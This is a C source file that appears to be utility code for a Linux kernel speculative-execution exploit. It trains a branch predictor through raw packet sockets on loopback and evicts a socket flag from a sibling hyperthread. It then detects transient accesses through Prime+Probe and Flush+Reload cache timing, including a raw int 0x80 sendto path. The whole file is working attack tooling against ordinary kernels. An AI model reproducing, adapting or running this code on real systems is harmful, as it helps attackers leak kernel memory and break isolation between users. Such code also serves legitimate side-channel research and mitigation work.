#include "specex_utils.h"
#include "envprep.h"
#include "llc_prime_probe.h"
#include "config.h"

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <sys/mman.h>

#define INIT_SOCKFD_NUM_EVIC_PAGES 16
#define NUM_ITER 1000000

extern int curr_specex_socket;
extern int specex_socket_first;
extern int specex_sockets_evicset_idx; // for flag eviction in co-thread

volatile char** sockfd_evicset_pages = NULL;
volatile int sockfd_evicset_num_pages = 0;
volatile int sockfd_evicset_num_pages_copy = 0;
volatile int sockfd_evicset_num_pages_max = 0;
volatile int sockfd_evicset_offset = 0;
volatile int sockfd_evicset_offset_copy = 0;
volatile int sockfd_evicset_rand_id = 0;
volatile int sockfd_evicset_rand_id_copy = 0;

void change_sockfd_evicset_offset(int new_offset);

//* * * * * * Flag evicting co-thread handlers * * * * *

// New thread is co-located on the same physical core as the main thread but on
// the other logical core on the physical core.
// This thread is responsible for evicting the flags in the socket object
// used for speculative execution.
void* start_co_thread(void* arg) {
  set_cpu(CO_THREAD_CPU_ID);

  if (pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, NULL)) {
    printf("[-] new thread: pthread_setcanceltype failed\n");
    return NULL;
  }

  int i;
  while(1) {
    uint64_t num_iter = NUM_ITER;
    int rand_id = sockfd_evicset_rand_id;
    int offset = sockfd_evicset_offset;
    int num_pages = sockfd_evicset_num_pages;

    while(num_iter) {
      for (i = 0; i < num_pages; i++) {
        *(sockfd_evicset_pages[i] + offset);
      }
      for (i = num_pages - 1; i >= 0; i--) {
        *(sockfd_evicset_pages[i] + offset);
      }
      num_iter -= 1;
    }

    sockfd_evicset_num_pages_copy = num_pages;
    sockfd_evicset_offset_copy = offset;
    sockfd_evicset_rand_id_copy = rand_id;
  }

  return NULL;
}

pthread_t flag_evic_thread;
void start_flag_eviction_in_co_thread() {
  if (specex_sockets_evicset_idx < 0) {
    printf("[-] Unexpected, cant start co_thread with unknown specex_sockets_evicset_idx\n");
    exit(1);
  }

  sockfd_evicset_pages = malloc(INIT_SOCKFD_NUM_EVIC_PAGES * sizeof(char*));
  sockfd_evicset_num_pages = pp_get_evicset_pages(specex_sockets_evicset_idx, (char**)sockfd_evicset_pages, INIT_SOCKFD_NUM_EVIC_PAGES);
  sockfd_evicset_num_pages_max = sockfd_evicset_num_pages;

  sockfd_evicset_offset = 0x860; // offset of flag
  sockfd_evicset_offset_copy = 0x0;

  int r = pthread_create(&flag_evic_thread, NULL, &start_co_thread, NULL);
  if (r != 0) {
    printf("[-] Failed to create co thread..\n");
    exit(1);
  }

  while (sockfd_evicset_offset_copy != sockfd_evicset_offset) {
    // wait for thread to finish one iteration so we are sure it is up and running
  }

  printf("\n[.] configured thread in adjacent logical core on the same physical core responsible for evicting conditional branch flag\n");
}

void stop_co_thread() {
  pthread_cancel(flag_evic_thread);
  pthread_join(flag_evic_thread, NULL);
  flag_evic_thread = 0x0;
  free(sockfd_evicset_pages);
  sockfd_evicset_pages = NULL;
}

void change_sockfd_evicset_offset(int new_offset) {
  sockfd_evicset_offset = new_offset;

  sockfd_evicset_rand_id = rand();
  while (sockfd_evicset_rand_id_copy != sockfd_evicset_rand_id) {
    // wait for thread to finish one iteration so we are sure offset is propagated
  }
}

void set_curr_specex_socket(int sock) {
  if (sock == curr_specex_socket) return;

  if (sock == specex_socket_first) {
    change_sockfd_evicset_offset(0x060);
  } else {
    change_sockfd_evicset_offset(0x860);
  }

  curr_specex_socket = sock;
}

//* * * * * * Speculative execution plus P+P and F+R * * * * *

char tbuffer[16];
int tsize = 0;
struct sockaddr_ll tsa;
int training_socket = -1;

void train_branch() {
  if (training_socket < 0) {
    training_socket = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
    if (training_socket == -1) {
      perror("[-] socket(SOCK_RAW)");
      exit(EXIT_FAILURE);
    }

    tsize = sizeof(tbuffer);

    memset(&tsa, 0, sizeof(tsa));
    tsa.sll_ifindex = if_nametoindex("lo");
    tsa.sll_halen = ETH_ALEN;
  }

  int i;
  for (i = 0; i < 5; ++i) {
    if (sendto(training_socket, tbuffer, tsize, 0, (struct sockaddr *)&tsa,
          sizeof(tsa)) < 0) {
      perror("[-] sendto(SOCK_RAW)");
      exit(EXIT_FAILURE);
    }
  }
}

#define SPECEX_BUF_SIZE 16
char specex_buffer[SPECEX_BUF_SIZE];
struct sockaddr_ll specex_sa;

int specex_check_signal_pp(int num_execs, int min_evicts, int base_array_evicset_idx, int cacheline_idx) {
  int x, evicts = 0;
  for(x = 0; x < num_execs; x++) {
    train_branch();
    pp_prime_cacheset(base_array_evicset_idx, cacheline_idx);
    sendto(curr_specex_socket, specex_buffer, SPECEX_BUF_SIZE, 0, (struct sockaddr *)&specex_sa, sizeof(specex_sa));
    if (pp_probe_cacheset_access_time(base_array_evicset_idx, cacheline_idx) > 310) {
      evicts += 1;
      if (evicts == min_evicts) {
        return 1;
      }
    }
  }
  return 0;
}

__attribute__ ((noinline))
long syscall6(long syscall, long arg1, long arg2, long arg3, long arg4, long arg5, long arg6) {
  long ret = 0;
  asm volatile (
    "push %%rbp;"
    "mov %1,%%rax;"
    "mov %2,%%rbx;"
    "mov %3,%%rcx;"
    "mov %4,%%rdx;"
    "mov %5,%%rsi;"
    "mov %6,%%rdi;"
    "mov %7,%%rbp;"
    "int $0x80;"
    "mov %%rax, %0;"
    "pop %%rbp;"
    : "=r" (ret)
    : "r" (syscall), "r" (arg1), "r" (arg2), "r" (arg3),
      "r" (arg4), "r" (arg5), "r" (arg6)
    : "rax", "rbx", "rcx", "rdx", "rsi", "rdi", "rbp"
  );
  return ret;
}

int use_int0x80 = 0;
void* mapped_page = NULL;
void* mapped_buf = NULL;
struct sockaddr_ll* mapped_sa = NULL;

__attribute__((always_inline))
unsigned long probe(const char *adrs)
{
  volatile unsigned long time;

  asm __volatile__ (
    "mfence             \n"
    "lfence             \n"
    "rdtsc              \n"
    "lfence             \n"
    "movl %%eax, %%esi  \n"
    "movl (%1), %%eax   \n"
    "lfence             \n"
    "rdtsc              \n"
    "subl %%esi, %%eax  \n"
    //"clflush 0(%1)      \n"
    : "=a" (time)
    : "c" (adrs)
    :  "%esi", "%edx");

  return time;
}


__attribute__ ((always_inline))
void flush(volatile void *p)
{
  //printf("flush addr: 0x%lx\n", (unsigned long) p);

    asm volatile(
      "clflushopt (%0)\n"
      //"mfence      \n"
      //"lfence      \n"
      :: "r" (p)
    );
}

__attribute__((always_inline))
int specex_check_signal_fr(int num_execs, int min_hits, unsigned long signal_addr) {
  int i;
  int hits = 0;
  if (use_int0x80) {
    for (i = 0; i < num_execs; i++) {
      train_branch();

      flush((volatile void*) signal_addr);
      asm volatile(
        "mfence      \n"
        ::
      );
      syscall6(369, (long) curr_specex_socket, (long)mapped_buf, (long)SPECEX_BUF_SIZE, 0, (long)mapped_sa, sizeof(struct sockaddr_ll));
      if (probe((const char*) signal_addr) < 100) {
        hits++;
        if (hits == min_hits) {
          return 1;
        }
      }
    }
  } else {
    for (i = 0; i < num_execs; i++) {
      train_branch();

      flush((volatile void*) signal_addr);
      asm volatile(
        "mfence      \n"
        ::
      );
      sendto(curr_specex_socket, specex_buffer, SPECEX_BUF_SIZE, 0, (struct sockaddr *)&specex_sa, sizeof(specex_sa));
      if (probe((const char*) signal_addr) < 100) {
        hits++;
        if (hits == min_hits) {
          return 1;
        }
      }
    }
  }

  return 0;
}

void init_specex_utils() {
  // for normal sendto syscall
  memset(&specex_sa, 0, sizeof(specex_sa));
  specex_sa.sll_ifindex = if_nametoindex("lo");
  specex_sa.sll_halen = ETH_ALEN;

  // for int 0x80 sendto syscall
  mapped_page = mmap((void*)0x880000, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0);
  if (mapped_page == MAP_FAILED) {
    perror("mmap");
    exit(1);
  }
  memset(mapped_page, 0x00, 0x1000);
  mapped_buf = mapped_page + 0x100;
  mapped_sa = mapped_page + 0x600;

  memcpy(mapped_buf, specex_buffer, SPECEX_BUF_SIZE);
  memcpy(mapped_sa,  &specex_sa, sizeof(struct sockaddr_ll));
}
